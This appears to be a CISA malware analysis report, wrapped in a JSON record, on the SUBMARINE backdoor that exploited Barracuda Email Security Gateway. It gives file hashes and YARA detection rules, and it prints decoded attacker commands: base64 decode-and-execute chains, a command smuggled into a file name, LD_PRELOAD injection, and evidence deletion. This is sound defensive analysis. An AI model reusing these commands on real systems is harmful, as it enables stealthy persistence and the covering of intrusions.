{
    "id": "974a16c3-b086-48c7-ae30-339725dbcbbe",
    "created_at": "2025-01-27T02:05:47.022797Z",
    "updated_at": "2025-03-27T02:05:18.518721Z",
    "deleted_at": null,
    "sha1_hash": "2f7c07d47654e02294290dd32b2d1df9534e5eb0",
    "title": "MAR-10454006.r1.v2.CLEAR",
    "authors": "",
    "file_creation_date": "2023-07-27T20:13:11Z",
    "file_modification_date": "2023-07-27T20:13:11Z",
    "file_size": 1238521,
    "plain_text": "## 10454006.r1.v2\n\n# Malware Analysis Report 2023-07-27\n\n\n## NNoottiiffiiccaattiioonn\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any\nwarranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service\nreferenced in this bulletin or otherwise.\nThis document is marked TLP:CLEAR--Recipients may share this information without restriction. Sources may use TLP:CLEAR when\ninformation carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release.\nSubject to standard copyright rules, TLP:CLEAR information may be shared without restriction. For more information on the Traffic Light\nProtocol (TLP), see http://www.cisa.gov/tlp.\n\n## SSuummmmaarryy\n\n\nDDeessccrriippttiioonn\n\n\nCISA obtained seven malware samples related to a novel backdoor CISA has named SUBMARINE. The malware was used by threat\nactors exploiting CVE-2023-2868, a former zero-day vulnerability affecting certain versions 5.1.3.001 - 9.2.0.006 of Barracuda Email\nSecurity Gateway (ESG).\n\nSUBMARINE is a novel persistent backdoor that lives in a Structured Query Language (SQL) database on the ESG appliance. SUBMARINE\ncomprises multiple artifacts that, in a multi-step process, enable execution with root privileges, persistence, command and control, and\ncleanup. In addition to SUBMARINE, CISA obtained associated Multipurpose Internet Mail Extensions (MIME) attachment files from the\nvictim. These files contained the contents of the compromised SQL database, which included sensitive information.\n\nFor information about related malware, specifically information on the initial exploit payload and other backdoors, see CISA Alert: CISA\nReleases Malware Analysis Reports on Barracuda Backdoors.\n\n\nSSuubbmmiitttteedd FFiilleess ((55))\n\n\n6dd8de093e391da96070a978209ebdf9d807e05c89dba13971be5aea2e1251d0 (r)\n81cf3b162a4fe1f1b916021ec652ade4a14df808021eeb9f7c81c8d2326bddab (libutil.so)\n8695945155d3a87a5733d31bf0f4c897e133381175e1a3cdc8c73d9e38640239 (machineecho_-n_Y2htb2QgK3ggL3J...)\nb98f8989e8706380f779bfd464f3dea87c122651a7a6d06a994d9a4758e12e43 (sedO4CWZ9)\ncc131dd1976a47ee3b631a136c3224a138716e9053e04d8bea3ee2e2c5de451a (smtpctl)\n\n\nAAddddiittiioonnaall FFiilleess ((22))\n\n\n2a353e9c250e5ea905fa59d33faeaaa197d17b4a4785456133aab5dbc1d1d5d5 (config.TRG)\nbbbae0455f8c98cc955487125a791052353456c8f652ddee14f452415c0b235a (run.sh)\n\n## FFiinnddiinnggss\n\n22aa335533ee99cc225500ee55eeaa990055ffaa5599dd3333ffaaeeaaaaaa119977dd1177bb44aa44778855445566113333aaaabb55ddbbcc11dd11dd55dd55\n\n\nDDeettaaiillss\n\n\nNNaammee config.TRG\n\nSSiizzee 5465 bytes\n\nTTyyppee ASCII text, with very long lines\n\nMMDD55 d03e1f112f0c784a39003e0b3992ad80\n\n\n-----\n\nSSHHAA11 447369281ba26b7a6da4f659aa31026605aa3c6f\n\nSSHHAA225566 2a353e9c250e5ea905fa59d33faeaaa197d17b4a4785456133aab5dbc1d1d5d5\n\nSSHHAA551122 aead33a656f647d58da0a7f5240eb8cd7c0121c9ea33ae6504687b5faf21779e67b659a93987392033ea8ae2aae239\ne432444dcddad52f2a8665add7265902f6\nssssddeeeepp 96:CjXDCc0wSWbCZgFHwlJc8UpsmdpanoP5Mc8wWuMdHABIz2mN:CjXDN0wSWQp08UpsmFm4mhCm\n\nEEnnttrrooppyy 6.062477\n\n\nAAnnttiivviirruuss\n\n\nNo matches found.\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_06 : SUBMARINE trojan backdoor cleans_traces_of_infection hides_artifacts installs_other_components\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-11\"\nLast_Modified = \"20230727_1200\"\nActor = \"n/a\"\nFamily = \"SUBMARINE\"\nCapabilities = \"cleans-traces-of-infection hides-artifacts installs-other-components\"\nMalware_Type = \"trojan backdoor\"\nTool_Type = \"unknown\"\nDescription = \"Detects SUBMARINE SQL trigger samples\"\nSHA256_1 = \"2a353e9c250e5ea905fa59d33faeaaa197d17b4a4785456133aab5dbc1d1d5d5\"\nstrings:\n$s1 = { 54 52 49 47 47 45 52 }\n$s2 = { 43 52 45 41 54 45 }\n$s3 = { 53 45 4c 45 43 54 20 22 65 63 68 6f 20 2d 6e }\n$s4 = { 62 61 73 65 36 34 20 2d 64 20 7c 20 73 68 }\n$s5 = { 72 6f 6f 74 }\n$s6 = { 53 45 54 }\n$s7 = { 45 4e 44 20 49 46 3b }\n$s8 = { 48 34 73 49 41 41 41 41 41 41 41 41 41 2b 30 61 43 33 42 55 }\n$s9 = { 2f 76 61 72 2f 74 6d 70 2f 72 }\n$s10 = { 2f 72 6f 6f 74 2f 6d 61 63 68 69 6e 65 }\ncondition:\nfilesize < 250KB and all of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nDDeessccrriippttiioonn\n\n\nThe file 'config.TRG' is a SUBMARINE artifact. The presence of the filename, 'config.TRG' does not indicate that the ESG is infected.\nInstead, it is the actual contents of the file that determine whether it is infected or not. The contents of 'config.TRG' is contained within\nthe SQL database file called 'config.snapshot' and the MIME attachments. Presence of the contents of the file 'config.TRG' within the\nSQL database is indicative of an infection of SUBMARINE.\n\nThe file contains a malicious SQL trigger called ‘cuda_trigger’ (Figure 1). This SQL trigger is set to run as root on the local host before a\nrow is deleted from the database. After the trigger parameters are met, two actions occur. First a compressed, base64 encoded blob\ncontaining 2 files is written into a file called ‘r’ in the ‘/var/tmp’ directory (Figure 2). Second, a base64 encoded command is executed\n(Figure 3).\n\n--Begin Base64 Decoded Command-cat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp\nnohup bash /var/tmp/run.sh <BSMTP_ID> >/dev/null 2>&1 &\nrm -f /root/machine\\` *chmod +x /root/mac*\n\n\n-----\n\nsh /root/mach*\\`*\n--End Base64 Decoded Command-\nThe commands will decode the base64 encoded string and execute the decoded result as a shell command. The commands will pass\nthe contents of the file 'r' to be decoded then decompressed with the 'tar' command. Then, the file 'run.sh' executes with the 'nohup'\nparameter. The 'nohup' parameter allows the process launched on the shell to continue executing even if the shell is closed. The\n'BSMTP_ID' is passed and all errors redirected and discarded to the '/dev/null' directory. Lastly, the contents of the '/root/machine'\ndirectory will be removed, permissions are set to executable, and shell scripts containing a name with the string 'mach*' in the root\ndirectory are executed.\n\n\nSSccrreeeennsshhoottss\n\n\nFFiigguurree 11.. -- The malicious SQL trigger called 'cuda_trigger'.\n\nFFiigguurree 22.. -- A small snippet of the base64 blob being written into the file 'r'.\n\nFFiigguurree 33.. -- A small snippet of the base64 encoded command found after 'r' is written.\n\n88669955994455115555dd33aa8877aa55773333dd3311bbff00ff44cc889977ee113333338811117755ee11aa33ccddcc88cc7733dd99ee3388664400223399\n\n\nDDeettaaiillss\n\n\nNNaammee machineecho_-n_Y2htb2QgK3ggL3Jvb3QvbWFjKgpzaCAvcm9vdC9tYWNoKlxgKgoK___base64_-d__sh\n\nSSiizzee 202 bytes\n\nTTyyppee ASCII text\n\nMMDD55 c5c93ba36e079892c1123fe9dffd660f\n\nSSHHAA11 e1df0da64a895ff00fc27a41898aa221b5b7d926\n\nSSHHAA225566 8695945155d3a87a5733d31bf0f4c897e133381175e1a3cdc8c73d9e38640239\n\nSSHHAA551122 a07e79b99e02fa52ab5ab75fc2d989d35d4b360a57fdf0ec5569f445fe1820d26915adbd4f30e3a9126e5cabcde9ca8\n40779039393c39e5838618f06db47a4cc\nssssddeeeepp 3:jT81L9RUjD+rlczyX837QTa0NDO9Z8giofQHcQMHL6wF8ufIhW0TaT7ZsNvn:c1JRID+pc2XS7Ga0yYgC3GLX8Q0TaRsv\n\nEEnnttrrooppyy 5.481015\n\n\nAAnnttiivviirruuss\n\n\nNo matches found.\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_07 : SUBMARINE trojan dropper exploit_kit evades_av hides_executing_code hides_artifacts exploitation\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-11\"\nLast_Modified = \"20230711_1830\"\nActor = \"n/a\"\nFamily = \"SUBMARINE\"\n\n\n-----\n\nCapabilities = \"evades-av hides-executing-code hides-artifacts\"\nMalware_Type = \"trojan dropper exploit-kit\"\nTool_Type = \"exploitation\"\nDescription = \"Detects ESG FileName exploit samples\"\nSHA256 = \"8695945155d3a87a5733d31bf0f4c897e133381175e1a3cdc8c73d9e38640239\"\nstrings:\n$s1 = { 7c 20 62 61 73 65 36 34 20 2d 64 20 7c 20 73 68 }\n$s2 = { 65 63 68 6f 20 2d 6e }\n$s3 = { 59 32 46 30 49 43 39 32 59 58 49 76 64 47 31 77 4c 33 49 67 66 43 42 69 59 58 4e 6c 4e 6a 51 67 4c 57 51 67 4c\n57 6b 67 66 43 42 30 59 58 49 67 }\ncondition:\nfilesize < 1KB and all of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nDDeessccrriippttiioonn\n\n\nThe file 'machineecho -n Y2htb2QgK3ggL3Jvb3QvbWFjKgpzaCAvcm9vdC9tYWNoKlxgKgoK _ base64 -d _sh`_' is a SUBMARINE artifact.\nThe file is a shell script identified in the '/root' directory and contains base64 encoded commands. The name of the file is designed to\nexploit a vulnerability on the target environment where the base64 string within the file name will be executed on the Linux shell.\n\n--Begin Base64 Decoded Name/Command-chmod +x /root/mac*\nsh /root/mach*\\`*\n--End Base64 Decoded Name/Command-\nThe above commands will change the permissions of the directory, '/root/mac*', to executable.\n\nThe file contains a series of operations, such as decoding a base64 encoded string and executing the decoded result as a shell\ncommand. The decoded base64 string represents a series of commands that will be executed by the shell.\n\n~Begin Base64 Decoded Command~\n\ncat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp\nnohup bash /var/tmp/run.sh <REDACTED BSMTP_ID>  >/dev/null 2>&1 &\nrm -f /root/machine\\`*\n\n~End Base64 Decoded Command~\n\nThis command is identical to the decoded base64 commands found in the SQL trigger identified in the file 'config.snapshot'.\n\n66dddd88ddee009933ee339911ddaa9966007700aa997788220099eebbddff99dd880077ee0055cc8899ddbbaa1133997711bbee55aaeeaa22ee11225511dd00\n\n\nDDeettaaiillss\n\n\nNNaammee r\n\nSSiizzee 4857 bytes\n\nTTyyppee ASCII text, with very long lines\n\nMMDD55 03e07c538a5e0e7906af803a83c97a1e\n\nSSHHAA11 600452b1cff8d99e41093be8b68f62e7c85f23d7\n\nSSHHAA225566 6dd8de093e391da96070a978209ebdf9d807e05c89dba13971be5aea2e1251d0\n\nSSHHAA551122 a4a6257dd6f859ae58de3b46879926ce99e3e3edb16db37dc80da4975f5a2866f4cd722233b98c9553e319e61661c\nae98d535ccb26d8c9709cf6f2efa56b9b3f\nssssddeeeepp 96:pjXDCc0wSWbCZgFHwlJc8UpsmdpanoP5Mc8wWuMdHABIZ:pjXDN0wSWQp08UpsmFm4mhCC\n\nEEnnttrrooppyy 5.988140\n\n\nAAnnttiivviirruuss\n\n\n-----\n\nNo matches found.\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_02 : SUBMARINE trojan backdoor exploitation hides_artifacts prevents_artifact_access\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-06-29\"\nLast_Modified = \"20230711_1500\"\nActor = \"n/a\"\nFamily = \"SUBMARINE\"\nCapabilities = \"hides-artifacts prevents-artifact-access\"\nMalware_Type = \"trojan backdoor\"\nTool_Type = \"exploitation\"\nDescription = \"Detects encoded GZIP archive samples\"\nSHA256_1 = \"6dd8de093e391da96070a978209ebdf9d807e05c89dba13971be5aea2e1251d0\"\nstrings:\n$s1 = { 48 34 73 49 41 41 41 41 41 41 41 41 41 2b 30 61 }\n$s2 = { 44 44 44 41 67 50 39 2f 2b 43 38 47 70 2f 36 63 41 46 41 41 41 41 3d 3d 0a}\n$s3 = { 37 56 4d 70 56 58 4f 37 2b 6d 4c 39 78 2b 50 59 }\ncondition:\nfilesize < 6KB and 3 of them and (math.entropy(0,filesize) > 5.8)\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n81cf3b162a4fe1f1b916021ec652ade4a14df8\n6dd8de093e... Contains\n08021eeb9f7c81c8d2326bddab\n\nbbbae0455f8c98cc955487125a7910523534\n6dd8de093e... Contains\n56c8f652ddee14f452415c0b235a\n\n\nDDeessccrriippttiioonn\n\n\nThe file 'r' is a SUBMARINE artifact. The file is a Base64 encoded GNU Zip (GZIP) archive. When the 'cat /*/*/r | base64 -d -i | tar -zx -C\n/*/*' Linux Shell command is applied to 'r', it decompresses two files. The aforementioned Linux Shell command is contained in\n'config.snapshot' as a Base64 encoded SQL trigger.\n\n--Begin Decompressed Files-1. run.sh (bbbae0455f8c98cc955487125a791052353456c8f652ddee14f452415c0b235a)\n2. libutil.so (81cf3b162a4fe1f1b916021ec652ade4a14df808021eeb9f7c81c8d2326bddab)\n--End Decompressed Files-\nbbbbbbaaee00445555ff88cc9988cccc995555448877112255aa779911005522335533445566cc88ff665522ddddeeee1144ff445522441155cc00bb223355aa\n\n\nDDeettaaiillss\n\n\nNNaammee run.sh\n\nSSiizzee 473 bytes\n\nTTyyppee POSIX shell script, ASCII text executable\n\nMMDD55 c2e577c71d591999ad5c581e49343093\n\nSSHHAA11 d446e06e40053214788aa1bad17b6d3587a2a370\n\nSSHHAA225566 bbbae0455f8c98cc955487125a791052353456c8f652ddee14f452415c0b235a\n\nSSHHAA551122 ffe528fcb448424b1f811a4b9068402971bf2705ad64e556071a062cd89d74d371d3ef41afca38450b7d8457611246a\n6ba35478dfc83e997950d2f85c8dac80f\nssssddeeeepp 12:avOAsp2yBXGTVjnJAIFw/J7G80ZWkbUErPzg:azsphBXSFZFwgLWkXg\n\n\n-----\n\nEEnnttrrooppyy 5.323635\n\n\nAAnnttiivviirruuss\n\n\nNo matches found.\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_03 : SUBMARINE trojan backdoor loader rootkit virus controls_local_machine hides_artifacts infects_files\n\ninstalls_other_components remote_access exploitation information_gathering\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-03\"\nLast_Modified = \"20230711_1500\"\nActor = \"n/a\"\nFamily = \"SUBMARINE\"\nCapabilities = \"controls-local-machine hides-artifacts infects-files installs-other-components\"\nMalware_Type = \"trojan backdoor loader rootkit virus\"\nTool_Type = \"remote-access exploitation information-gathering\"\nDescription = \"Detects SUBMARINE launcher script samples\"\nSHA256_1 = \"bbbae0455f8c98cc955487125a791052353456c8f652ddee14f452415c0b235a\"\nstrings:\n$s1 = { 73 65 64 20 2d 69 }\n$s2 = { 4c 44 5f 50 52 45 4c 4f 41 44 3d }\n$s3 = { 6c 69 62 75 74 69 6c 2e 73 6f }\n$s4 = { 2f 73 62 69 6e 2f 73 6d 74 70 63 74 6c }\n$s5 = { 2f 62 6f 6f 74 2f 6f 73 5f 74 6f 6f 6c 73 }\n$s6 = { 72 6d 20 2d 72 66 }\n$s7 = { 62 61 73 65 36 34 20 2d 64 }\n$s8 = { 7c 73 68 }\n$s9 = { 72 65 73 74 61 72 74 }\n$s10 = { 2f 64 65 76 2f 6e 75 6c 6c }\n$s11 = { 23 21 20 2f 62 69 6e 2f 73 68 }\n$s12 = { 62 61 73 65 36 34 }\ncondition:\nfilesize < 2KB and all of them\n}\n\n- rule CISA_10454006_04 : SUBMARINE trojan backdoor hides_artifacts hides_executing_code infects_files\n\ninstalls_other_components remote_access exploitation\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230711_1500\"\nActor = \"n/a\"\nFamily = \"SUBMARINE\"\nCapabilities = \"hides-artifacts hides-executing-code infects-files installs-other-components\"\nMalware_Type = \"trojan backdoor\"\nTool_Type = \"remote-access exploitation\"\nDescription = \"Detects SUBMARINE launcher script samples\"\nSHA256_1 = \"b98f8989e8706380f779bfd464f3dea87c122651a7a6d06a994d9a4758e12e43\"\nstrings:\n$s1 = { 73 6c 65 65 70 }\n$s2 = { 7c 62 61 73 65 36 34 20 2d 64 }\n$s3 = { 4c 44 5f 50 52 45 4c 4f 41 44 }\n\n\n-----\n\n$s4 = { 2f 68 6f 6d 65 2f 70 72 6f 64 75 63 74 2f 63 6f 64 65 2f 66 69 72 6d 77 61 72 65 2f 63 75 72 72 65 6e 74 2f 73 62\n69 6e 2f 73 6d 74 70 63 74 6c 20 72 65 73 74 61 72 74 }\n$s5 = { 65 63 68 6f 20 2d 6e 20 27 }\n$s6 = { 73 68 }\n$s7 = { 23 21 20 2f 62 69 6e 2f 73 68 }\ncondition:\nfilesize < 2KB and 6 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n6dd8de093e391da96070a978209ebdf9d807e\nbbbae0455f... Contained_Within\n05c89dba13971be5aea2e1251d0\n\n\nDDeessccrriippttiioonn\n\n\nThe file 'run.sh' is a SUBMARINE loader. The file is a shell script located at within the archive 'r' in the '/var/tmp' directory. The purpose\nof 'run.sh' is to perform a combination of file manipulation, script generation and execution (Figure 4). There are 4 variables within\n'run.sh':\n\n--Begin Variable List-\nB1=$1\nF=\"/boot/os_tools/hw-set\"\nS=\"/home/product/code/firmware/current/sbin/smtpctl\"\nA=\"/boot/os_tools/libutil.so\"\nB=`echo -n \"sed -i \\\"s|exec|BSMTP_ID=$B1 LD_PRELOAD=$A exec|g\\\" $S\"|base64 -w0`\n\n--End Variable List-\nThe script begins by moving SUBMARINE from the '/var/tmp/' directory to the '/boot/os_tools/' directory for persistence.\n\nThe variable \"B\" is declared as a 'sed' command that replaces all occurrences of the string 'exec' with `BSMTP_ID=$1\nLD_PRELOAD=/boot/os_tools/libutil.so exec /home/product/code/firmware/current/sbin/smtpctl'. This 'sed' command is then base64\nencoded.\n\nA new file called 'hw-set' is created in the '/boot/os_tools/' directory. A line is appended to the 'smtpctl' file which checks for the string\n'LD_PRELOAD'. If the string is not found, the base64 encoded string stored in variable \"B\" is decoded and executed as a shell command\nand 'smtpctl' is restarted.\n\nThe 'chmod' command is used to set executable permissions for 'hw-set'.\n\nThe 'sed' command is used with a '-i' flag to modify the file 'update_version' within the '/boot/os_tools/' directory with an appended\nstring to line 44. The appended string, \"system('/boot/os_tools/hw-set 2>&1 >/dev/null &');\", will run the file 'hw-set' in the background\nand redirect both output and errors to 'dev/null' whenever the file 'update_version' is executed.\n\nThe file 'hw-set' is executed and the 'sed' command with the '-i' flag is used to insert the string 'sleep 2m' on line 1 to set a sleep\nduration of 2 minutes.\n\nFinally, all files and directories within '/var/tmp/' directory are removed.\n\n\nSSccrreeeennsshhoottss\n\n\n-----\n\nFFiigguurree 44.. -- The contents of the file, 'run.sh.'\n\nbb9988ff88998899ee88770066338800ff777799bbffdd446644ff33ddeeaa8877cc112222665511aa77aa66dd0066aa999944dd99aa44775588ee1122ee4433\n\n\nDDeettaaiillss\n\n\nNNaammee hw-set\n\nNNaammee sedO4CWZ9\n\nSSiizzee 341 bytes\n\nTTyyppee POSIX shell script, ASCII text executable, with very long lines\n\nMMDD55 b860198feca7398bc79a8ec69afc65ed\n\nSSHHAA11 c4c64da81995044ea3447b8ffd07689382b7487b\n\nSSHHAA225566 b98f8989e8706380f779bfd464f3dea87c122651a7a6d06a994d9a4758e12e43\n\nSSHHAA551122 0d4b66dbeb88e8c9fb970572c033ab84b8273734277edb139cdc04560a0547d192a6762fc8ed8138eb43f7d05df6c3\n6aa6bc1987eda4a4b6075e9059e71ef358\nssssddeeeepp 6:JkKgPxJooRKGKBNvd/UntDEcQwj7bPfNcgUBZqcL0FcXfFtC2i+RKGKBNvSv:alZJoospwtIclTNcRDnv7CJ+spSv\n\nEEnnttrrooppyy 5.713942\n\n\nAAnnttiivviirruuss\n\n\nNo matches found.\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_04 : SUBMARINE trojan backdoor hides_artifacts hides_executing_code infects_files\n\ninstalls_other_components remote_access exploitation\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230711_1500\"\nActor = \"n/a\"\nFamily = \"SUBMARINE\"\nCapabilities = \"hides-artifacts hides-executing-code infects-files installs-other-components\"\nMalware_Type = \"trojan backdoor\"\nTool_Type = \"remote-access exploitation\"\nDescription = \"Detects SUBMARINE launcher script samples\"\nSHA256_1 = \"b98f8989e8706380f779bfd464f3dea87c122651a7a6d06a994d9a4758e12e43\"\n\n\n-----\n\nstrings:\n$s1 = { 73 6c 65 65 70 }\n$s2 = { 7c 62 61 73 65 36 34 20 2d 64 }\n$s3 = { 4c 44 5f 50 52 45 4c 4f 41 44 }\n$s4 = { 2f 68 6f 6d 65 2f 70 72 6f 64 75 63 74 2f 63 6f 64 65 2f 66 69 72 6d 77 61 72 65 2f 63 75 72 72 65 6e 74 2f 73 62\n69 6e 2f 73 6d 74 70 63 74 6c 20 72 65 73 74 61 72 74 }\n$s5 = { 65 63 68 6f 20 2d 6e 20 27 }\n$s6 = { 73 68 }\n$s7 = { 23 21 20 2f 62 69 6e 2f 73 68 }\ncondition:\nfilesize < 2KB and 6 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nDDeessccrriippttiioonn\n\n\nThe file 'hw-set' is a SUBMARINE artifact. The file is a shell script located in the '/boot/os_tools/' directory and contains shell commands\nas well as a base64 encoded string (Figure 5). The shell script is set to sleep for 2 minutes prior to execution. The 'grep' command\nchecks if the string 'LD_PRELOAD' is contained within the 'smtpctl' file located at '/home/product/code/firmware/current/sbin/'. The\nexclamation point (!) prepending the script is used to check for success or failure of the 'grep' command. If the string 'LD_PRELOAD' is\nnot identified, a base64 encoded 'sed' command is used to modify the 'smtpctl' file (Figure 6).\n\n\nSSccrreeeennsshhoottss\n\n\nFFiigguurree 55.. -- The contents of the shell script in the file 'hw-set'.\n\nFFiigguurree 66.. -- The decoded base64 string contained in the shell script of the file 'hw-set'.\n\ncccc113311dddd11997766aa4477eeee33bb663311aa113366cc33222244aa113388771166ee99005533ee0044dd88bbeeaa33eeee22ee22cc55ddee445511aa\n\n\nDDeettaaiillss\n\n\nNNaammee smtpctl\n\nSSiizzee 3759 bytes\n\nTTyyppee POSIX shell script, ASCII text executable\n\nMMDD55 35a432e40da597c7ab63ff16b09d19d8\n\nSSHHAA11 b798b881b89526051ee5d50f24239b3a952c9724\n\nSSHHAA225566 cc131dd1976a47ee3b631a136c3224a138716e9053e04d8bea3ee2e2c5de451a\n\nSSHHAA551122 af6aa47f44e604a60930f122ebd47d6c1b83c756b005d79ade8af147bfbfab40f16ba91e32021d65b18b21e06911476\nfb5d03f050850c8300d1e7d7a3e61c36b\nssssddeeeepp 48:t7c4VFuL2/zkanTvNpofcgBnY5NBFTGc5FjJWgkFBhhkQ1jtbA5lwmNdBITf3K3M:xcOko1iyGc6FzKAjDTvssgRaI7Q\n\nEEnnttrrooppyy 5.178501\n\n\nAAnnttiivviirruuss\n\n\nNo matches found.\n\n\n-----\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_05 : SUBMARINE trojan backdoor remote_access_trojan compromises_data_integrity\n\ncleans_traces_of_infection hides_artifacts installs_other_components remote_access exploitation\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230711_1500\"\nActor = \"n/a\"\nFamily = \"SUBMARINE\"\nCapabilities = \"compromises-data-integrity cleans-traces-of-infection hides-artifacts installs-other-components\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"remote-access exploitation\"\nDescription = \"Detects SUBMARINE launcher script samples\"\nSHA256_1 = \"cc131dd1976a47ee3b631a136c3224a138716e9053e04d8bea3ee2e2c5de451a\"\nstrings:\n$s1 = { 4c 44 5f 50 52 45 4c 4f 41 44 }\n$s2 = { 23 21 20 2f 62 69 6e 2f 73 68 }\n$s3 = { 4c 44 5f 50 52 45 4c 4f 41 44 3d 2f 62 6f 6f 74 2f 6f 73 5f 74 6f 6f 6c 73 2f 6c 69 62 75 74 69 6c 2e 73 6f 20 65 78\n65 63 }\n$s4 = { 3e 2f 64 65 76 2f 6e 75 6c 6c 20 32 3e 26 31 }\n$s5 = { 62 73 6d 74 70 64 20 63 6f 6e 74 72 6f 6c 20 73 63 72 69 70 74 }\n$s6 = { 42 53 4d 54 50 44 5f 50 49 44 }\n$s7 = { 2f 72 65 6c 6f 61 64 2f 72 65 73 74 61 72 74 }\ncondition:\nfilesize < 6KB and 6 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nDDeessccrriippttiioonn\n\n\nThe file 'smtpctl' is a SUBMARINE loader. The file is a maliciously modified shell script used to remove mail files in 2 directories as well\nas load SUBMARINE as a shared library for the Batched Simple Mail Transfer Protocol (BSMTP) daemon.\n\n~Begin File Removal Commands~\nrm -f /mail/scan/body*\nrm -f /mail/tmp/mimeattach.*\n~End File Removal Commands~\n\nAppended malicious code at the bottom of 'smtpctl.sh' sets the BSMTP_ID and SUBMARINE is preloaded as a shared library from the\n'/boot/os_tools' directory. It then executes the BSMTP daemon. If the BSMTPD_PID variable is set, debug mode is enabled. If the\nBSMTPD_PID variable is not set, execution continues without enabling debug mode. Additionally, any instances of the string 'reload' in\nthe command are replaced with 'restart' and all errors are redirected to '/dev/null' (Figure 7).\n\n\nSSccrreeeennsshhoottss\n\n\nFFiigguurree 77.. -- The appended malicious code loading SUBMARINE as the shared library for the BSMTP daemon. The BSMTP_ID value\nwill be unique per device.\n\n8811ccff33bb116622aa44ffee11ff11bb991166002211eecc665522aaddee44aa1144ddff880088002211eeeebb99ff77cc8811cc88dd22332266bbddddaabb\n\n\n-----\n\nDDeettaaiillss\n\n\nNNaammee libutil.so\n\nNNaammee update_version\n\nSSiizzee 9396 bytes\n\nTTyyppee ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, stripped\n\nMMDD55 b745626b36b841ed03eddfb08e6bb061\n\nSSHHAA11 cb20b167795db258b307ddee91ded87a9e7562d0\n\nSSHHAA225566 81cf3b162a4fe1f1b916021ec652ade4a14df808021eeb9f7c81c8d2326bddab\n\nSSHHAA551122 d6b9dfc9b784ca76386cbbf2c75c7e0ad3ac45e4420a838bc21b1464d07208f46901d7a0c8fbeca90303ce48720d7fd\n60b76d25cfebf5ea5b385e6b9db10ed98\nssssddeeeepp 96:dVdsadO5BT/aucX3Qa/c2D1UKDUzW1MuBFQC0NysEuSobXoWhP:yadO5B71cX3Qgc2uKD+aMLC01EuSo\n\nEEnnttrrooppyy 3.466134\n\nPPaatthh /boot/os_tools/libutil.so\n\nPPaatthh /boot/os_tools/update_version\n\nPPaatthh /var/tmp/libutil.so\n\n\nAAnnttiivviirruuss\n\n\nNo matches found.\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_01 : SUBMARINE trojan backdoor remote_access_trojan remote_access information_gathering exploitation\n\ndetermines_c2_server controls_local_machine compromises_data_integrity\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10452108\"\nDate = \"2023-06-29\"\nLast_Modified = \"20230711_1500\"\nActor = \"n/a\"\nFamily = \"SUBMARINE\"\nCapabilities = \"determines-c2-server controls-local-machine compromises-data-integrity\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"remote-access information-gathering exploitation\"\nDescription = \"Detects SUBMARINE Barracuda backdoor samples\"\nSHA256_1 = \"81cf3b162a4fe1f1b916021ec652ade4a14df808021eeb9f7c81c8d2326bddab\"\nstrings:\n$s1 = { 32 35 30 2d 6d 61 69 6c 32 2e 65 63 63 65 6e 74 72 69 63 2e 64 75 63 6b }\n$s2 = { 6f 70 65 6e 73 73 6c 20 61 65 73 2d 32 35 36 }\n$s3 = { 65 63 68 6f 20 2d 6e 20 27 25 73 27 20 7c 20 62 61 73 65 36 34 20 2d 64 }\n$s4 = { 2d 69 76 }\n$s5 = { 48 65 6c 6c 6f 20 25 73 20 5b 25 73 5d 2c 20 70 6c 65 61 73 65 64 20 74 6f 20 6d 65 65 74 20 79 6f 75 }\n$s6 = { e8 47 fa ff }\n$s7 = { 63 6f 6d 6d 61 6e 64 }\n$s8 = { 2d 69 76 20 36 39 38 32 32 62 36 63 }\n$s9 = { 73 65 6e 64 }\n$s10 = { 73 6f 63 6B 65 74 }\n$s11 = { 63 6f 6e 6e 65 63 74 }\ncondition:\nfilesize < 15KB and 8 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n-----\n\n6dd8de093e391da96070a978209ebdf9d807e\n81cf3b162a... Contained_Within\n05c89dba13971be5aea2e1251d0\n\n\nDDeessccrriippttiioonn\n\n\nThe file 'libutil.so' is the SUBMARINE payload. 'libutil.so' is preloaded into the BSMTP daemon, the Linux executable responsible for\nreceiving emails, and processing Simple Mail Transfer Protocol (SMTP) reply messages. Linux Shared Object Preloading is analogous to\nDynamic-Link Library (DLL) side loading and 